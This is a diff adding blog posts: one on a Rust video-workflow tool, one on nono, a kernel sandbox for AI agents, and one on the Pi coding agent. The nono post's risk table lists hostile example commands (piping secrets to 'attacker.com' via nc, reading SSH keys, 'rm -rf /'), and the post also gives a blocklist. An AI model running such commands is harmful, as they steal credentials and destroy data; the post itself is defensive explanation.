+<p>Skip expensive steps whose outputs already exist:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vwf run workflow.yaml <span class="nt">--workdir</span> work <span class="nt">--resume</span>
+</code></pre></div></div>
+
+<p>Steps declare <code class="language-plaintext highlighter-rouge">resume_output</code> for completion checking. Media files are validated via ffprobe duration—no half-written WAV files sneaking through.</p>
+
+<h2 id="the-crates">The Crates</h2>
+
+<h3 id="vwf-foundation-4-crates">vwf-foundation (4 crates)</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Crate</th>
+      <th>Purpose</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>vwf-types</strong></td>
+      <td>TaskId, ArtifactId, TaskStatus, ArtifactStatus</td>
+    </tr>
+    <tr>
+      <td><strong>vwf-runtime</strong></td>
+      <td>Runtime trait, FsRuntime, DryRunRuntime, output validation</td>
+    </tr>
+    <tr>
+      <td><strong>vwf-dag</strong></td>
+      <td>Scheduler, Task, Artifact, State persistence</td>
+    </tr>
+    <tr>
+      <td><strong>vwf-queue</strong></td>
+      <td>GPU semaphores for TTS/lipsync serialization</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="vwf-engine-4-crates">vwf-engine (4 crates)</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Crate</th>
+      <th>Purpose</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>vwf-config</strong></td>
+      <td>Workflow YAML parsing and validation</td>
+    </tr>
+    <tr>
+      <td><strong>vwf-render</strong></td>
+      <td>Template `` substitution</td>
+    </tr>
+    <tr>
+      <td><strong>vwf-steps</strong></td>
+      <td>Step implementations (7 types)</td>
+    </tr>
+    <tr>
+      <td><strong>vwf-core</strong></td>
+      <td>Engine orchestration, RunReport, resume</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="vwf-apps-2-crates">vwf-apps (2 crates)</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Crate</th>
+      <th>Purpose</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>vwf-cli</strong></td>
+      <td>Command-line interface with –resume flag</td>
+    </tr>
+    <tr>
+      <td><strong>vwf-web</strong></td>
+      <td>Yew/WASM UI (skeleton)</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="why-this-fixes-agent-drift">Why This Fixes Agent Drift</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Problem</th>
+      <th>Solution</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Agents forget steps</td>
+      <td>Steps are data, executed by code</td>
+    </tr>
+    <tr>
+      <td>Parameters drift</td>
+      <td>Config is versioned YAML, not improvised</td>
+    </tr>
+    <tr>
+      <td>Order confusion</td>
+      <td>DAG scheduler resolves dependencies</td>
+    </tr>
+    <tr>
+      <td>Hidden failures</td>
+      <td>Every run produces a manifest</td>
+    </tr>
+    <tr>
+      <td>Context overload</td>
+      <td>Each step gets minimal, focused context</td>
+    </tr>
+    <tr>
+      <td>Expensive re-runs</td>
+      <td>Resume skips completed steps</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The LLM call becomes <strong>one step among many</strong>, with captured output that other steps can parse and validate.</p>
+
+<h2 id="current-status">Current Status</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Milestone</th>
+      <th>Status</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Workflow Runner</td>
+      <td>Complete</td>
+    </tr>
+    <tr>
+      <td>Shell Step</td>
+      <td>Complete</td>
+    </tr>
+    <tr>
+      <td>TTS Voice Cloning</td>
+      <td>Complete</td>
+    </tr>
+    <tr>
+      <td>Text-to-Image (FLUX)</td>
+      <td>Complete</td>
+    </tr>
+    <tr>
+      <td>Image-to-Video (SVD)</td>
+      <td>Complete</td>
+    </tr>
+    <tr>
+      <td>Text-to-Video (Wan 2.2)</td>
+      <td>Complete</td>
+    </tr>
+    <tr>
+      <td>Music Generation</td>
+      <td>Complete</td>
+    </tr>
+    <tr>
+      <td>Resume Support</td>
+      <td>Complete</td>
+    </tr>
+    <tr>
+      <td>LLM Adapter</td>
+      <td>Partial (mock only)</td>
+    </tr>
+    <tr>
+      <td>Web UI</td>
+      <td>Skeleton</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="the-sharpen-the-saw-philosophy">The Sharpen-the-Saw Philosophy</h2>
+
+<p>This project exists because I was losing hours to agent failures every week. Instead of fighting the same battles repeatedly, I spent time building infrastructure that makes future production smoother.</p>
+
+<p>The ROI is clear:</p>
+<ul>
+  <li><strong>Before</strong>: 30+ minutes debugging agent amnesia per video</li>
+  <li><strong>After</strong>: Workflows execute deterministically, failures are traceable, progress resumes</li>
+</ul>
+
+<p>Sometimes the best coding session is the one that makes all future sessions easier.</p>
+
+<div class="references-section">
+
+  <h2 id="references">References</h2>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Resource</th>
+        <th>Link</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>“Sharpen the Saw”</strong></td>
+        <td><a href="https://en.wikipedia.org/wiki/The_7_Habits_of_Highly_Effective_People">The 7 Habits of Highly Effective People</a> (Stephen Covey)</td>
+      </tr>
+      <tr>
+        <td><strong>ComfyUI</strong></td>
+        <td><a href="https://github.com/comfyanonymous/ComfyUI">ComfyUI</a></td>
+      </tr>
+      <tr>
+        <td><strong>FLUX.1</strong></td>
+        <td><a href="https://blackforestlabs.ai/">Black Forest Labs</a></td>
+      </tr>
+      <tr>
+        <td><strong>Stable Video Diffusion</strong></td>
+        <td><a href="https://stability.ai/stable-video">Stability AI</a></td>
+      </tr>
+      <tr>
+        <td><strong>Wan 2.1/2.2</strong></td>
+        <td><a href="https://huggingface.co/Wan-AI">Alibaba Wan</a></td>
+      </tr>
+      <tr>
+        <td><strong>midi-cli-rs</strong></td>
+        <td><a href="https://github.com/softwarewrighter/midi-cli-rs">midi-cli-rs</a> (procedural music generation)</td>
+      </tr>
+      <tr>
+        <td><strong>FluidSynth</strong></td>
+        <td><a href="https://www.fluidsynth.org/">FluidSynth</a> (MIDI-to-WAV rendering)</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3 id="soundfonts-for-commercial-use">SoundFonts for Commercial Use</h3>
+
+  <p>MIDI-to-WAV rendering requires SoundFont files (.sf2). For commercial video production, use soundfonts with clear licensing:</p>
+
+  <table>
+    <thead>
+      <tr>
+        <th>SoundFont</th>
+        <th>License</th>
+        <th>Notes</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>GeneralUser GS</strong></td>
+        <td>Permissive</td>
+        <td><a href="https://schristiancollins.com/generaluser.php">Download</a> - explicitly allows commercial music production</td>
+      </tr>
+      <tr>
+        <td><strong>FluidR3_GM</strong></td>
+        <td>MIT</td>
+        <td>Included with FluidSynth - clear commercial use rights</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <p>Avoid GPL-licensed soundfonts (e.g., TimGM6mb) if you need unambiguous commercial rights for rendered audio.</p>
+
+</div>
+
+<hr />
+
+<p><em>Habit 7: Sharpen the Saw. Sometimes the tool you need doesn’t exist yet—so you build it.</em></p>
+
+
+          </div><img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
+      </li><li class="post-item" data-index="2"><p class="post-meta">January 2, 2027 &bull; Software Wrighter</p>
+<p class="post-reading-info"><em><span class="post-word-count">851 words</span> &bull; <span class="post-read-time">5 min read</span></em></p><h3>
+          <a class="post-link" href="/2027/01/02/nono-sandbox-ai-agents/">
+            nono: Kernel-Level Sandboxing for AI Agents
+          </a>
+        </h3><nav class="toc" data-toc-id="nono-sandbox-ai-agents">
+  <h4>Contents</h4>
+  <ul class="toc-list"></ul>
+</nav>
+
+<style>
+/* Post content flows around floated TOC */
+.post-content {
+  overflow: hidden;
+}
+
+.toc {
+  background: #fffde7;
+  border-radius: 8px;
+  padding: 1rem 1.5rem;
+  margin: 0 1.5rem 1rem 0;
+  float: left;
+  max-width: 280px;
+}
+
+[data-theme="dark"] .toc {
+  background: #3d3a00;
+}
+
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) .toc {
+    background: #3d3a00;
+  }
+}
+
+.toc h4 {
+  margin: 0 0 0.75rem 0;
+  font-size: 1rem;
+}
+
+.toc ul {
+  margin: 0;
+  padding-left: 1.25rem;
+  list-style-type: disc;
+}
+
+.toc li {
+  margin: 0.25rem 0;
+}
+
+.toc li.toc-h3 {
+  margin-left: 1rem;
+  font-size: 0.95em;
+}
+
+.toc a {
+  text-decoration: none;
+}
+
+.toc a:hover {
+  text-decoration: underline;
+}
+
+
+@media (max-width: 600px) {
+  .toc {
+    float: none;
+    max-width: 100%;
+    margin: 0 0 1.5rem 0;
+  }
+}
+
+/* References section that floats alongside TOC */
+.references-float {
+  overflow: hidden; /* contain floated content */
+}
+
+.references-float h2 {
+  margin-top: 0;
+  font-size: 1.25rem;
+}
+
+.references-float table {
+  font-size: 0.9em;
+  width: 100%;
+}
+
+.references-float td, .references-float th {
+  padding: 0.4rem 0.6rem;
+  vertical-align: top;
+}
+
+.references-float td:first-child {
+  white-space: nowrap;
+  font-weight: bold;
+  width: 1%;
+}
+
+@media (max-width: 600px) {
+  .references-float table {
+    font-size: 0.85em;
+  }
+}
+</style>
+
+<script>
+(function() {
+  // Run after DOM is ready
+  function initTOC() {
+    document.querySelectorAll('.toc').forEach(function(toc) {
+      if (toc.dataset.initialized) return;
+      toc.dataset.initialized = 'true';
+
+      const tocList = toc.querySelector('.toc-list');
+      if (!tocList) return;
+
+      // Find the associated post-content (next sibling or parent's post-content)
+      let article = toc.nextElementSibling;
+      while (article && !article.classList.contains('post-content')) {
+        article = article.nextElementSibling;
+      }
+      // Fallback: look for .post-content in the document (single post page)
+      if (!article) {
+        article = document.querySelector('.post-content');
+      }
+
+      if (!article) {
+        toc.style.display = 'none';
+        return;
+      }
+
+      const headings = article.querySelectorAll('h2, h3');
+
+      if (headings.length < 3) {
+        toc.style.display = 'none';
+        return;
+      }
+
+      const tocId = toc.dataset.tocId || Math.random().toString(36).substr(2, 9);
+
+      headings.forEach(function(heading, index) {
+        // Add unique ID if missing
+        if (!heading.id) {
+          heading.id = 'toc-' + tocId + '-heading-' + index;
+        }
+
+        const li = document.createElement('li');
+        li.className = 'toc-' + heading.tagName.toLowerCase();
+
+        const a = document.createElement('a');
+        a.href = '#' + heading.id;
+        a.textContent = heading.textContent;
+
+        li.appendChild(a);
+        tocList.appendChild(li);
+      });
+    });
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTOC);
+  } else {
+    initTOC();
+  }
+})();
+</script>
+<div class="post-content">
+          <p><img src="/assets/images/posts/nature-mural.png" class="post-marker" alt="" /></p>
+
+<p>No to unauthorized filesystem access. No to secret exfiltration. No to destructive commands.</p>
+
+<p><strong>nono</strong> is a capability-based security shell that uses kernel-level primitives to sandbox AI agents. Once restrictions are applied, there’s no API to escape—not even for nono itself.</p>
+
+<div class="resource-box">
+
+  <table>
+    <thead>
+      <tr>
+        <th>Resource</th>
+        <th>Link</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Website</strong></td>
+        <td><a href="https://nono.sh/">nono.sh</a></td>
+      </tr>
+      <tr>
+        <td><strong>Code</strong></td>
+        <td><a href="https://github.com/lukehinds/nono">lukehinds/nono</a></td>
+      </tr>
+      <tr>
+        <td><strong>Docs</strong></td>
+        <td><a href="https://docs.nono.sh">docs.nono.sh</a></td>
+      </tr>
+      <tr>
+        <td><strong>Article</strong></td>
+        <td><a href="https://dev.to/lukehinds/introducing-nono-a-secure-sandbox-for-ai-agents-1lo2">Introducing nono (DEV)</a></td>
+      </tr>
+      <tr>
+        <td><strong>Video</strong></td>
+        <td>Coming soon</td>
+      </tr>
+    </tbody>
+  </table>
+
+</div>
+
+<h2 id="the-problem-ai-agents-have-shell-access">The Problem: AI Agents Have Shell Access</h2>
+
+<p>AI coding agents like Claude Code run shell commands. That’s powerful—and dangerous.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Risk</th>
+      <th>Example</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Data exfiltration</strong></td>
+      <td><code class="language-plaintext highlighter-rouge">curl secrets.txt \| nc attacker.com</code></td>
+    </tr>
+    <tr>
+      <td><strong>Credential theft</strong></td>
+      <td><code class="language-plaintext highlighter-rouge">cat ~/.ssh/id_rsa</code></td>
+    </tr>
+    <tr>
+      <td><strong>Destructive commands</strong></td>
+      <td><code class="language-plaintext highlighter-rouge">rm -rf /</code></td>
+    </tr>
+    <tr>
+      <td><strong>Config tampering</strong></td>
+      <td><code class="language-plaintext highlighter-rouge">chmod 777 /etc/passwd</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Policy-based filtering can be bypassed. You need structural enforcement.</p>
+
+<h2 id="nono-structural-impossibility">nono: Structural Impossibility</h2>
+
+<p>nono doesn’t filter operations—it makes unauthorized operations <strong>structurally impossible</strong> at the kernel level.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Give Claude Code access only to current directory</span>
+nono run <span class="nt">--allow</span> <span class="nb">.</span> <span class="nt">--</span> claude
+
+<span class="c"># Separate read and write permissions</span>
+nono run <span class="nt">--allow</span> ./project <span class="nt">--write</span> ./output <span class="nt">--</span> claude
+
+<span class="c"># Block network entirely</span>
+nono run <span class="nt">--allow</span> <span class="nb">.</span> <span class="nt">--net-block</span> <span class="nt">--</span> my-agent
+</code></pre></div></div>
+
+<p>Once inside nono, there is no mechanism to bypass restrictions. The kernel denies unauthorized operations.</p>
+
+<h2 id="how-it-works">How It Works</h2>
+
+<h3 id="kernel-primitives">Kernel Primitives</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Platform</th>
+      <th>Mechanism</th>
+      <th>Requirements</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Linux</strong></td>
+      <td>Landlock LSM</td>
+      <td>Kernel 5.13+ (fs), 6.7+ (net)</td>
+    </tr>
+    <tr>
+      <td><strong>macOS</strong></td>
+      <td>Seatbelt</td>
+      <td>10.5+</td>
+    </tr>
+    <tr>
+      <td><strong>Windows</strong></td>
+      <td>Planned</td>
+      <td>-</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="defense-in-depth">Defense in Depth</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─────────────────────────────────────┐
+│  1. Command Blocklist               │  rm, dd, chmod, sudo blocked
+├─────────────────────────────────────┤
+│  2. Kernel Delete Enforcement       │  unlink/rmdir syscalls blocked
+├─────────────────────────────────────┤
+│  3. Kernel Truncate Protection      │  File zeroing prevented
+├─────────────────────────────────────┤
+│  4. Filesystem Sandbox              │  Path access via allowlists
+├─────────────────────────────────────┤
+│  5. Network Isolation               │  Network blocked when enabled
+└─────────────────────────────────────┘
+</code></pre></div></div>
+
+<h3 id="no-escape-hatch">No Escape Hatch</h3>
+
+<p>The agent cannot request more permissions because <strong>the mechanism doesn’t exist</strong>. Child processes inherit all restrictions.</p>
+
+<h2 id="why-not-containers">Why Not Containers?</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Approach</th>
+      <th>Overhead</th>
+      <th>Setup</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Docker/Podman</td>
+      <td>Images, layers, runtime</td>
+      <td>Volume mounts, networking</td>
+    </tr>
+    <tr>
+      <td>VMs</td>
+      <td>Full OS</td>
+      <td>Significant resources</td>
+    </tr>
+    <tr>
+      <td><strong>nono</strong></td>
+      <td><strong>None</strong></td>
+      <td>Single command</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>nono applies kernel-enforced restrictions directly to a process. No images, no volumes, no runtime.</p>
+
+<h2 id="installation">Installation</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># macOS (Homebrew)</span>
+brew tap lukehinds/nono
+brew <span class="nb">install </span>nono
+
+<span class="c"># From source (requires Rust)</span>
+git clone https://github.com/lukehinds/nono.git
+<span class="nb">cd </span>nono
+cargo build <span class="nt">--release</span>
+</code></pre></div></div>
+
+<h2 id="usage-examples">Usage Examples</h2>
+
+<h3 id="basic-sandboxing">Basic Sandboxing</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Read-only access to project</span>
+nono run <span class="nt">--allow</span> ./src <span class="nt">--</span> <span class="nb">cat </span>src/main.rs
+
+<span class="c"># Read/write to specific directory</span>
+nono run <span class="nt">--allow</span> <span class="nb">.</span> <span class="nt">--write</span> ./output <span class="nt">--</span> python build.py
+
+<span class="c"># Preview without executing</span>
+nono run <span class="nt">--allow</span> <span class="nb">.</span> <span class="nt">--dry-run</span> <span class="nt">--</span> claude
+</code></pre></div></div>
+
+<h3 id="ai-agent-workflows">AI Agent Workflows</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Claude Code with project access</span>
+nono run <span class="nt">--allow</span> ./my-project <span class="nt">--</span> claude
+
+<span class="c"># GPT wrapper with network blocked</span>
+nono run <span class="nt">--allow</span> <span class="nb">.</span> <span class="nt">--net-block</span> <span class="nt">--</span> gpt-cli
+
+<span class="c"># Any agent, any tool</span>
+nono run <span class="nt">--allow</span> ./workspace <span class="nt">--</span> opencode
+</code></pre></div></div>
+
+<h3 id="debugging">Debugging</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Why was this path blocked?</span>
+nono why /etc/passwd
+</code></pre></div></div>
+
+<h2 id="sensitive-paths-protected-by-default">Sensitive Paths Protected by Default</h2>
+
+<p>nono blocks access to sensitive paths automatically:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">~/.ssh/</code> - SSH keys</li>
+  <li><code class="language-plaintext highlighter-rouge">~/.aws/</code> - AWS credentials</li>
+  <li><code class="language-plaintext highlighter-rouge">~/.bashrc</code>, <code class="language-plaintext highlighter-rouge">~/.zshrc</code> - Shell configs</li>
+  <li><code class="language-plaintext highlighter-rouge">~/.gnupg/</code> - GPG keys</li>
+</ul>
+
+<p>Your secrets stay secret.</p>
+
+<h2 id="rust-wrapper-potential">Rust Wrapper Potential</h2>
+
+<p>nono is written in Rust. This makes it an excellent candidate for:</p>
+
+<ul>
+  <li><strong>RLM integration</strong> - Wrap nono as a Rust library for programmatic sandboxing</li>
+  <li><strong>Custom agent runtimes</strong> - Embed capability-based security in Rust agents</li>
+  <li><strong>Build system integration</strong> - Sandbox untrusted build steps</li>
+</ul>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Hypothetical Rust wrapper</span>
+<span class="k">use</span> <span class="nn">nono</span><span class="p">::{</span><span class="n">Sandbox</span><span class="p">,</span> <span class="n">Capability</span><span class="p">};</span>
+
+<span class="k">let</span> <span class="n">sandbox</span> <span class="o">=</span> <span class="nn">Sandbox</span><span class="p">::</span><span class="nf">new</span><span class="p">()</span>
+    <span class="nf">.allow_read</span><span class="p">(</span><span class="s">"./src"</span><span class="p">)</span>
+    <span class="nf">.allow_write</span><span class="p">(</span><span class="s">"./output"</span><span class="p">)</span>
+    <span class="nf">.block_network</span><span class="p">()</span>
+    <span class="nf">.build</span><span class="p">()</span><span class="o">?</span><span class="p">;</span>
+
+<span class="n">sandbox</span><span class="nf">.run</span><span class="p">(</span><span class="s">"cargo build"</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h2 id="key-takeaways">Key Takeaways</h2>
+
+<ol>
+  <li>
+    <p><strong>Kernel enforcement beats policy filtering.</strong> Structural impossibility &gt; detection and blocking.</p>
+  </li>
+  <li>
+    <p><strong>Capability-based security works.</strong> Grant explicit capabilities, deny everything else.</p>
+  </li>
+  <li>
+    <p><strong>Lightweight beats heavyweight.</strong> No containers, no VMs, just kernel primitives.</p>
+  </li>
+  <li>
+    <p><strong>AI agents need sandboxing.</strong> Shell access is powerful—and dangerous.</p>
+  </li>
+</ol>
+
+<h2 id="about-the-creator">About the Creator</h2>
+
+<p><strong>Luke Hinds</strong> is the creator of <a href="https://sigstore.dev/">Sigstore</a> and former Distinguished Engineer at Red Hat. nono brings the same security-first mindset to AI agent sandboxing.</p>
+
+<h2 id="resources">Resources</h2>
+
+<ul>
+  <li><a href="https://nono.sh/">nono Website</a></li>
+  <li><a href="https://github.com/lukehinds/nono">GitHub Repository</a></li>
+  <li><a href="https://docs.nono.sh">Documentation</a></li>
+  <li><a href="https://dev.to/lukehinds/introducing-nono-a-secure-sandbox-for-ai-agents-1lo2">Introducing nono (DEV Community)</a></li>
+</ul>
+
+<hr />
+
+<p><em>No means no. Kernel-enforced sandboxing for the agentic age.</em></p>
+
+          </div>
+
+
+
+
+
+<img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
+      </li><li class="post-item" data-index="3"><p class="post-meta">January 1, 2027 &bull; Software Wrighter</p>
+<p class="post-reading-info"><em><span class="post-word-count">514 words</span> &bull; <span class="post-read-time">3 min read</span></em></p><h3>
+          <a class="post-link" href="/2027/01/01/pi-minimal-agent-openclaw/">
+            Pi: The Minimal Agent That Powers OpenClaw
+          </a>
+        </h3><nav class="toc" data-toc-id="pi-minimal-agent-openclaw">
+  <h4>Contents</h4>
+  <ul class="toc-list"></ul>
+</nav>
+
+<style>
+/* Post content flows around floated TOC */
+.post-content {
+  overflow: hidden;
+}
+
+.toc {
+  background: #fffde7;
+  border-radius: 8px;
+  padding: 1rem 1.5rem;
+  margin: 0 1.5rem 1rem 0;
+  float: left;
+  max-width: 280px;
+}
+
+[data-theme="dark"] .toc {
+  background: #3d3a00;
+}
+
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) .toc {
+    background: #3d3a00;
+  }
+}
+
+.toc h4 {
+  margin: 0 0 0.75rem 0;
+  font-size: 1rem;
+}
+
+.toc ul {
+  margin: 0;
+  padding-left: 1.25rem;
+  list-style-type: disc;
+}
+
+.toc li {
+  margin: 0.25rem 0;
+}
+
+.toc li.toc-h3 {
+  margin-left: 1rem;
+  font-size: 0.95em;
+}
+
+.toc a {
+  text-decoration: none;
+}
+
+.toc a:hover {
+  text-decoration: underline;
+}
+
+
+@media (max-width: 600px) {
+  .toc {
+    float: none;
+    max-width: 100%;
+    margin: 0 0 1.5rem 0;
+  }
+}
+
+/* References section that floats alongside TOC */
+.references-float {
+  overflow: hidden; /* contain floated content */
+}
+
+.references-float h2 {
+  margin-top: 0;
+  font-size: 1.25rem;
+}
+
+.references-float table {
+  font-size: 0.9em;
+  width: 100%;
+}
+
+.references-float td, .references-float th {
+  padding: 0.4rem 0.6rem;
+  vertical-align: top;
+}
+
+.references-float td:first-child {
+  white-space: nowrap;
+  font-weight: bold;
+  width: 1%;
+}
+
+@media (max-width: 600px) {
+  .references-float table {
+    font-size: 0.85em;
+  }
+}
+</style>
+
+<script>
+(function() {
+  // Run after DOM is ready
+  function initTOC() {
+    document.querySelectorAll('.toc').forEach(function(toc) {
+      if (toc.dataset.initialized) return;
+      toc.dataset.initialized = 'true';
+
+      const tocList = toc.querySelector('.toc-list');
+      if (!tocList) return;
+
+      // Find the associated post-content (next sibling or parent's post-content)
+      let article = toc.nextElementSibling;
+      while (article && !article.classList.contains('post-content')) {
+        article = article.nextElementSibling;
+      }
+      // Fallback: look for .post-content in the document (single post page)
+      if (!article) {
+        article = document.querySelector('.post-content');
+      }
+
+      if (!article) {
+        toc.style.display = 'none';
+        return;
+      }
+
+      const headings = article.querySelectorAll('h2, h3');
+
+      if (headings.length < 3) {
+        toc.style.display = 'none';
+        return;
+      }
+
+      const tocId = toc.dataset.tocId || Math.random().toString(36).substr(2, 9);
+
+      headings.forEach(function(heading, index) {
+        // Add unique ID if missing
+        if (!heading.id) {
+          heading.id = 'toc-' + tocId + '-heading-' + index;
+        }
+
+        const li = document.createElement('li');
+        li.className = 'toc-' + heading.tagName.toLowerCase();
+
+        const a = document.createElement('a');
+        a.href = '#' + heading.id;
+        a.textContent = heading.textContent;
+
+        li.appendChild(a);
+        tocList.appendChild(li);
+      });
+    });
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTOC);
+  } else {
+    initTOC();
+  }
+})();
+</script>
+<div class="post-content">
+          <p><img src="/assets/images/posts/flowers.png" class="post-marker" alt="" /></p>
+
+<p>Four tools. That’s it. Read, Write, Edit, Bash.</p>
+
+<p>Pi is the minimal coding agent created by Mario Zechner, and it’s the engine behind OpenClaw—the agent framework that’s becoming the future of agentic coding.</p>
+
+<div class="resource-box">
+
+  <table>
+    <thead>
+      <tr>
+        <th>Resource</th>
+        <th>Link</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Pi Mono Repo</strong></td>
+        <td><a href="https://github.com/badlogic/pi-mono">badlogic/pi-mono</a></td>
+      </tr>
+      <tr>
+        <td><strong>Armin’s Extensions</strong></td>
+        <td><a href="https://github.com/mitsuhiko/agent-stuff">mitsuhiko/agent-stuff</a></td>
+      </tr>
+      <tr>
+        <td><strong>Article</strong></td>
+        <td><a href="https://lucumr.pocoo.org/2026/1/31/pi/">Pi: The Minimal Agent</a></td>
+      </tr>
+      <tr>
+        <td><strong>Video</strong></td>
+        <td>Coming soon</td>
+      </tr>
+    </tbody>
+  </table>
+
+</div>
+
+<h2 id="the-philosophy-minimal-core-maximum-capability">The Philosophy: Minimal Core, Maximum Capability</h2>
+
+<p>Most agents try to do everything. Pi does almost nothing—and that’s the point.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Agent Approach</th>
+      <th>Tools</th>
+      <th>Philosophy</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Traditional</td>
+      <td>Dozens</td>
+      <td>Built-in everything</td>
+    </tr>
+    <tr>
+      <td><strong>Pi</strong></td>
+      <td><strong>4</strong></td>
+      <td>Extensions for the rest</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Pi’s four core tools:</p>
+<ul>
+  <li><strong>Read</strong>: Read files</li>
+  <li><strong>Write</strong>: Write files</li>
+  <li><strong>Edit</strong>: Edit files</li>
+  <li><strong>Bash</strong>: Run commands</li>
+</ul>
+
+<p>Everything else is an extension.</p>
+
+<h2 id="what-is-openclaw">What is OpenClaw?</h2>
+
+<p>OpenClaw is an agent framework built on Pi’s components. It connects an agent to a communication channel of your choice and just runs code.</p>
+
+<p>The key insight: LLMs are really good at writing and running code, so embrace this.</p>
+
+<h2 id="architecture">Architecture</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─────────────────────────────────────┐
+│         Communication Layer         │  Telegram, CLI, etc.
+├─────────────────────────────────────┤
+│            OpenClaw                 │  Agent Framework
+├─────────────────────────────────────┤
+│              Pi Core                │  4 tools + extensions
+├─────────────────────────────────────┤
+│         Custom AI SDK               │  Multi-provider support
+└─────────────────────────────────────┘
+</code></pre></div></div>
+
+<h3 id="key-features">Key Features</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Feature</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Tree sessions</strong></td>
+      <td>Sessions stored as trees, enabling branching and navigation</td>
+    </tr>
+    <tr>
+      <td><strong>Multi-provider</strong></td>
+      <td>Switch models within single sessions</td>
+    </tr>
+    <tr>
+      <td><strong>Hot reloading</strong></td>
+      <td>Develop extensions without restarting</td>
+    </tr>
+    <tr>
+      <td><strong>TUI rendering</strong></td>
+      <td>Spinners, progress bars, data tables</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="the-extension-system">The Extension System</h2>
+
+<p>Extensions can:</p>
+<ul>
+  <li>Register tools</li>
+  <li>Create TUI components</li>
+  <li>Function as skills</li>
+  <li>Persist state into sessions</li>
+</ul>
+
+<p>Armin Ronacher’s extensions (in <a href="https://github.com/mitsuhiko/agent-stuff">mitsuhiko/agent-stuff</a>):</p>
+<ul>
+  <li><strong>answer</strong>: Response formatting</li>
+  <li><strong>todos</strong>: Task tracking</li>
+  <li><strong>review</strong>: Code review</li>
+  <li><strong>control</strong>: Flow control</li>
+  <li><strong>files</strong>: File operations</li>
+</ul>
+
+<h2 id="mcp-support-via-mcporter">MCP Support via mcporter</h2>
+
+<p>Pi doesn’t have built-in MCP support. Instead, OpenClaw uses <strong>mcporter</strong>, which exposes MCP calls via:</p>
+<ul>
+  <li>CLI interface</li>
+  <li>TypeScript bindings</li>
+</ul>
+
+<h2 id="built-on-pi">Built on Pi</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Project</th>
+      <th>Creator</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>OpenClaw</strong></td>
+      <td>Peter</td>
+      <td>Agent framework</td>
+    </tr>
+    <tr>
+      <td><strong>Telegram bot</strong></td>
+      <td>Armin Ronacher</td>
+      <td>Chat-based agent</td>
+    </tr>
+    <tr>
+      <td><strong>mom</strong></td>
+      <td>Mario Zechner</td>
+      <td><a href="https://github.com/badlogic/pi-mono/tree/main/packages/mom">badlogic/pi-mono/packages/mom</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="why-minimal-wins">Why Minimal Wins</h2>
+
+<p>The fascination with minimal agents: software that builds more software.</p>
+
+<ol>
+  <li><strong>Tiny system prompt</strong> - Pi has the shortest system prompt of any agent</li>
+  <li><strong>Composable</strong> - Build what you need</li>
+  <li><strong>Debuggable</strong> - Less magic, more transparency</li>
+  <li><strong>Fast</strong> - No bloat</li>
+</ol>
+
